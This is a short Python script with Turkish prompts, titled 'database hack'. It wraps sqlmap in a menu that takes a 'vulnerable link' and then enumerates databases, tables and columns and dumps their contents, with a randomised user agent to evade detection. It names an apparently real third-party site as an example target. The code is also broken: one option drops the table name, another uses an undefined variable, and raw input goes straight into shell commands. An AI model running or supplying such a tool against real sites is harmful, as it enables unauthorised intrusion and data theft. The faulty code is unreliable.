#!/usr/bin/env python

import os

os.system("apt-get install figlet")
os.system("clear")
os.system("figlet VERITABANI HACK")
print("""
Veri Tabanı Haclemeye Hoş Geldin Hacker : )

1) Sadece açıklı linki biliyorum.
2) Açıklı linki, Veritabanı adını biliyorum.
3) Açıklı linki, Veritabanı adını, Tablo adını biliyorum.
4) Açıklı linki, Veritabanı adını Tablo adını, Kolon adını biliyorum.

Ornek Açıklı Link : http://www.suesupriano.com/article.php?id=25

""")
islemno = input("İşlem linki girin : ")


if(islemno == "1"):
	aciklilink = input("Açıklı link girin : ")
	os.system("sqlmap -u " + aciklilink + " --dbs --random-agent")
elif(islemno == "2"):
	aciklilink = input("Açıklı link girin : ")
	veritabani = input("Veritabanı adını girin : ")
	os.system("sqlmap -u " + aciklilink + " -D " + veritabani + " --tables --random-agent")
elif(islemno == "3"):
	aciklilink = input("Açıklı link girin : ")
	veritabani = input("Veritabanı adını girin : ")
	tablo = input("Tablo adını girin : ")
	os.system("sqlmap -u " + aciklilink +  " -D " + veritabani + " -T " + " --columns --random-agent")
elif(islemno == "4"):
	aciklilink = input("Açıklı link girin : ")
	veritabani = input("Veritabanı adını girin : ")
	tablo = input("Tablo adını girin : ")
	kolon = input("Kolon adını girin : ")
	os.system("sqlmap -u " + aciklilink + " -D " + veritabani + " -T " + tablo + " -C " + colon + " --dump --random-agent")
else:
	print("Hatalı secim yaptın kapatıyorum...")
